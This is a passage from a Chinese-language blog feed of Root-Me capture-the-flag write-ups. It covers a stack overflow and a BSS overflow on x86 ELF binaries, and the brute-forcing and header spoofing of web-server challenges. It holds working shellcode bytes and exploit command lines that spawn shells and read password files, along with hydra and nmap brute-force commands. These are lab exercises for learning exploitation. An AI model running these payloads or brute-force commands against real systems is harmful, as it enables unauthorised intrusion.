argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p><pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8SHELLCODE will be at 0xbffff931app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8JUNK will be at 0xbffffb2b</code></pre><p><code>export PATH=</code>python -c “print ‘A’*160 + ‘\x31\xf9\xff\xbf’ + ‘\x2b\xfb\xff\xbf’”``</p><hr><p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p><pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre><p>总长33字节</p><p>然后溢出PATH，要保证$ebp+8的值不变（小端序），<br>path长119，再填充一个<code>：</code>，保持为4的倍数，</p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre><p><code>0xbfff56c</code>是USERNAME地址，<code>0xbffff750</code>是$ebp+8的值，现在PATH总长168。</p><pre><code>app-systeme-ch8@challenge02:~$ ./ch8[+] Getting env...bash-4.4$ cat .passwd</code></pre><h2 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h2><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p><code>export USERNAME=</code></p><p>gdb中<br><code>set env USERNAME=</code></p><p>查看<br><code>x/x env.path</code></p><h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p><hr><p><code>gdb-peda$ print $ebp-0xbffff55c</code></p><p><code>disas GetEnv</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-stack-buffer-overflow-basic-4&quot;&gt;&lt;a href=&quot;#ELF-x86-stack-buffer-overflow-basic-4&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - stack buffer overflow basic 4&quot;&gt;&lt;/a&gt;ELF x86 - stack buffer overflow basic 4&lt;/h1&gt;&lt;p&gt;参考: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&quot;&gt;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&quot;&gt;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&quot;&gt;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;&lt;code&gt;struct EnvInfo GetEnv(void)&amp;#123;&amp;#125;&lt;/code&gt; 中有&lt;code&gt;strcpy()&lt;/code&gt;函数，存在溢出点。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  &lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - BSS buffer overflow &amp; 构造shellcode</title>
    <link href="http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/"/>
    <id>http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/</id>
    <published>2020-12-28T12:24:01.000Z</published>
    <updated>2020-12-28T13:11:00.839Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - BSS buffer overflow &amp; 构造shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> username[<span class="number">512</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">void</span> (*_atexit)(<span class="keyword">int</span>) =  <span class="built_in">exit</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cp_username</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>((*(name++) = *(arg++)));</span><br><span class="line">  *name = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Usage : %s &lt;username&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  cp_username(username, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Running program with username : %s\n&quot;</span>, username);</span><br><span class="line">   </span><br><span class="line">  _atexit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>参考：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow</a></p><p>The atexit and the username are global variables. Therefore, those variables positioned at the .bss section.</p><p>r2查看</p><pre><code>0x0804a040 512 obj.username0x0804a240 4 obj._atexit</code></pre><p>用username溢出exit，控制EIP</p><pre><code>./ch7 `python -c &quot;print &#39;\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;`</code></pre><p>shellcode放在开头。</p><p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">http://www.kernel-panic.it/security/shellcode/shellcode5.html</a><br>生成shellcode:<br>execve(“/bin//sh”, [“/bin//sh”], NULL)</p><ol><li>a pointer to the name of the program to execute (in our case a pointer to the string <code>&quot;/bin/sh&quot;</code>);</li><li>a pointer to an array of strings to pass as <code>arguments </code>to the program (the first argument must be<code> argv[0]</code>, i.e. the name of the program itself). The <code>last element </code>of the array must be <code>a null pointer</code>;</li><li>a pointer to an array of strings to pass as environment to the program. These strings are usually in the form “key=value” and the last element must be a null pointer.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">2</span>];</span><br><span class="line">        args[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        args[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/root_me/app_system]└──╼ $./get_shell $ ls</code></pre><p>需要解决的问题：</p><ol><li>shellcode中不能有NULL字符</li><li>需要’/bin/sh’的地址</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jmp <span class="keyword">short</span> mycall      ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop   esi         ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call  shellcode   ; Push the address of the next byte onto the <span class="built_in">stack</span>: the next</span><br><span class="line">    db    <span class="string">&quot;/bin/sh&quot;</span>   ;   byte is the beginning of the <span class="built_in">string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_shell.<span class="keyword">asm</span></span><br><span class="line">jmp <span class="keyword">short</span>    mycall               ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop        esi                ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    <span class="keyword">xor</span>        eax, eax           ; Zero out EAX 通过EAX获得<span class="literal">NULL</span></span><br><span class="line">    mov byte   [esi + <span class="number">7</span>], al      ; Write the null byte at the end of the <span class="built_in">string</span> 在字符串后添加终结符</span><br><span class="line">    mov dword  [esi + <span class="number">8</span>],  esi    ; [ESI+<span class="number">8</span>], i.e. the memory immediately below the <span class="built_in">string</span></span><br><span class="line">                                  ;   <span class="string">&quot;/bin/sh&quot;</span>, will contain the <span class="built_in">array</span> pointed to by the</span><br><span class="line">                                  ;   <span class="function">second argument of <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span>; therefore we store in</span><br><span class="line">                                  ;   [ESI+<span class="number">8</span>] the address of the <span class="built_in">string</span>...</span><br><span class="line">    mov dword  [esi + <span class="number">12</span>], eax    ; ...<span class="keyword">and</span> in [ESI+<span class="number">12</span>] <span class="function">the <span class="literal">NULL</span> <span class="title">pointer</span> <span class="params">(EAX is <span class="number">0</span>)</span></span></span><br><span class="line">    mov        al,  0xb           ; Store the number of the syscall (11) in EAX</span><br><span class="line">    lea        ebx, [esi]         ; Copy the address of the <span class="built_in">string</span> in EBX 参数</span><br><span class="line">    lea        ecx, [esi + <span class="number">8</span>]     ; <span class="function">Second argument to <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)</span><br><span class="line">    <span class="keyword">int</span>        <span class="number">0x80</span>               ; Execute the system call</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call       shellcode          ; Push the address of <span class="string">&quot;/bin/sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    db         <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><pre><code>$ nasm -f elf get_shell.asm$ ojdump -d get_shell.o</code></pre><p>汇编后得到对象文件，查看机器码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch7@challenge02:~$ .&#x2F;ch7 &#96;python -c &quot;print &#39;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;&#96;</span><br><span class="line">[+] Running program with username : ë^1ÀˆF‰‰F</span><br><span class="line">°</span><br><span class="line">   V</span><br><span class="line"> ̀èãÿÿÿ&#x2F;bin&#x2F;shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ </span><br><span class="line">$ ls</span><br><span class="line">Makefile  ch7  ch7.c</span><br><span class="line">$ cat .passwd</span><br><span class="line">cat: .passwd: Permission denied</span><br></pre></td></tr></table></figure><p>shellcode权限不足</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-599.php">http://shell-storm.org/shellcode/files/shellcode-599.php</a><br>\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80<br>将0x17 改为0x46<br>When the permissions are setted to “s” instead of “S” a classic shellcode does not set EUID and UID of the current process to old UID (here app-systeme-ch7-cracked):<br>0x46 “sys_setreuid16” not the classic 0x17 “sys_setuid16” </p><hr><p>结构中函数指针<br>struct Dog {<br>    char name[12];<br>    void (<em>bark)();<br>    void (*bringBackTheFlag)();<br>    void (*death)(struct Dog</em>);<br>};</p><p><a href="https://cc-sir.github.io/2019/01/11/use_after_free/">https://cc-sir.github.io/2019/01/11/use_after_free/</a></p><p>use_after_free就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况:<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - BSS buffer overflow &amp;amp; 构造shellcode&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; username[&lt;span class=&quot;number&quot;&gt;512&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*_atexit)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) =  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cp_username&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *arg)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((*(name++) = *(arg++)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *name = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[-] Usage : %s &amp;lt;username&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  cp_username(username, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[+] Running program with username : %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _atexit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>web-server前四题</title>
    <link href="http://finsenty54.github.io/2020/12/20/web-server-front-4/"/>
    <id>http://finsenty54.github.io/2020/12/20/web-server-front-4/</id>
    <published>2020-12-20T05:41:40.000Z</published>
    <updated>2020-12-20T05:43:03.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><h2 id="tNikto"><a href="#tNikto" class="headerlink" title="tNikto"></a>tNikto</h2><p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。</p><p><code>nikto -host http://challenge01.root-me.org/web-serveur/ch3/</code></p><a id="more"></a><hr><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org</code></p><pre><code>-d: Increase debugging level-v: Increase verbosity level (use -vv or more for greater effect)--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</code></pre><hr><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p><code>hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ </code> </p><pre><code>- users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt- passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z</code></pre><h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><p><code>curl -L -A &quot;admin&quot; challenge01.root-me.org/web-serveur/ch2</code><br>     -A, –user-agent <name> Send User-Agent <name> to server<br>    -L, –location      Follow redirects</p><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://challenge01.root-me.org/web-serveur/ch2/&#x27;</span>, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Admin&#x27;</span>&#125;) </span><br><span class="line"><span class="built_in">print</span> resp.text</span><br></pre></td></tr></table></figure><h1 id="HTTP-open-redirt"><a href="#HTTP-open-redirt" class="headerlink" title="HTTP open redirt"></a>HTTP open redirt</h1><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Select a domain to <span class="built_in">hash</span> <span class="keyword">not</span> listed <span class="keyword">in</span> the page, like: https://google.com</span><br><span class="line"><span class="number">2.</span> Hash the string domain here <span class="keyword">or</span> another: http://www.fileformat.info/tool/<span 